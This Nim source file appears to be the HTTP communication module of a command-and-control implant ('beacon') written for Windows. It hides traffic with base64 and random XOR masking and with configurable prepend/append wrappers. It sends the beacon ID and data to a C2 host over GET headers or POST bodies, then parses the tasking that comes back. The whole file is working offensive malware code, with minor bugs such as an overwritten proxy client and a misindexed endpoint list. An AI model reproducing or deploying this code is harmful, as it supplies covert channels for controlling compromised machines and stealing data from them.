import std/[httpclient, random, net, strutils, base64, sequtils]
import ../[config, utils, meta]
import winim/[winstr, utils, lean]

randomize()

proc http_field_encode*(data: seq[byte], meth: openarray[string]): seq[byte] =
    result = data
    var mask_key: array[4, byte]
    for m in meth:
        case m
        of "base64":
            result = base64.encode(result).toSeq
        of "base64url":
            result = base64.encode(result, safe = true).toSeq
        of "mask":
            for i in 0..<mask_key.len: mask_key[i] = rand(255).byte
            for i in 0..<result.len: result[i] = result[i] xor mask_key[(i mod mask_key.len)]
            result.insert(mask_key, 0)
        of "netbios":
            discard
        of "netbiosu":
            discard
        of "":
            break
        else:
            dbg "[-] unknown encode method"

proc http_field_decode*(data: seq[byte], meth: openarray[string]): seq[byte] =
    result = data
    for i in countdown(meth.len-1, 0):
        var m = meth[i]
        case m
        of "base64":
            result = base64.decode(result.toString).toSeq
        of "base64url":
            result = base64.decode(result.toString).toSeq
        of "mask":
            var key: array[4, byte]
            for i in 0..<key.len: key[i] = result[i]
            result.delete(0..<4)
            # for empty response
            if result.len == 0: return result
            for i in 0..<result.len: result[i] = result[i] xor key[(i mod key.len)]
        of "netbios":
            discard
        of "netbiosu":
            discard
        of "":
            break
        else:
            dbg "[-] unknown encode method"

proc parse_c2_response(meth: HttpMethod, data: var string): seq[byte] =
    var prepend, append: string
    case meth
    of HttpGet:
        prepend = get_server_prepend
        append = get_server_append
    of HttpPost:
        prepend = post_server_prepend
        append = post_server_append
    else:
        dbg "[-] unknown http method"
        return

    removePrefix(data, prepend)
    removeSuffix(data, append)

    var data_bytes = data.toSeq
    data_bytes = http_field_decode(data_bytes, get_server_encrypt_type)
    return data_bytes

proc send_request_http_get*(data: seq[byte]): seq[byte] =
    var client: HttpClient
    
    try:
        if http_proxy_url != "": client = newHttpClient(proxy = newProxy(http_proxy_url), timeout = http_timeout, userAgent = "")
        else: client = newHttpClient(timeout = http_timeout, userAgent = "")
        if http_host_name != "": client.headers["Host"] = http_host_name

        # var ctx = newContext(verifyMode = CVerifyNone)
        # client = newHttpClient(timeout = http_timeout, userAgent = "", sslContext = ctx)
        client = newHttpClient(timeout = http_timeout, userAgent = "")
        var url = protocol & host & ":" & port & get_endpoints[rand(get_endpoints.len-1)]
        var actual_data = get_client_prepend & toString(http_field_encode(data, get_meta_encrypt_type)) & get_client_append
        case meta_data_field_type
        of "header": client.headers[meta_data_field] = actual_data
        else: dbg "[-] failed to send post request, unknown metadata field type: " & metadata_field_type
        
        var response = client.getContent(url)

        result = parse_c2_response(HttpGet, response)
        dbg "[+] parsed response: " & repr(result)
    except CatchableError:
        dbg "[-] failed to send get request: " & getCurrentExceptionMsg()
        return

proc send_request_http_post*(data: seq[byte]): seq[byte] =
    var client: HttpClient
    
    try:
        if http_proxy_url != "": client = newHttpClient(proxy = newProxy(http_proxy_url), timeout = http_timeout, userAgent = "")
        else: client = newHttpClient(timeout = http_timeout, userAgent = "")
        if http_host_name != "": client.headers["Host"] = http_host_name

        # var ctx = newContext(verifyMode = CVerifyNone)
        # client = newHttpClient(timeout = http_timeout, userAgent = "", sslContext = ctx)
        client = newHttpClient(timeout = http_timeout, userAgent = "")
        var url = protocol & host & ":" & port & post_endpoints[rand(get_endpoints.len-1)]
        var actual_data = post_client_prepend & toString(http_field_encode(data, post_client_data_encrypt_type)) & post_client_append

        case post_client_id_type
        of "parameter": url = url & "?" & post_client_id_field & "=" & toString(http_field_encode(($beacon_id).toSeq, post_client_id_encrypt_type))
        of "header": client.headers[post_client_id_field] = toString(http_field_encode(($beacon_id).toSeq, post_client_id_encrypt_type))
        else: dbg "[-] failed to send get request, unknown metadata field type: " & metadata_field_type
        
        var response = client.postContent(url, body=actual_data)

        result = parse_c2_response(HttpPost, response)
        dbg "[+] parsed response: " & repr(result)
    except CatchableError:
        dbg "[-] failed to send get request: " & getCurrentExceptionMsg()
        return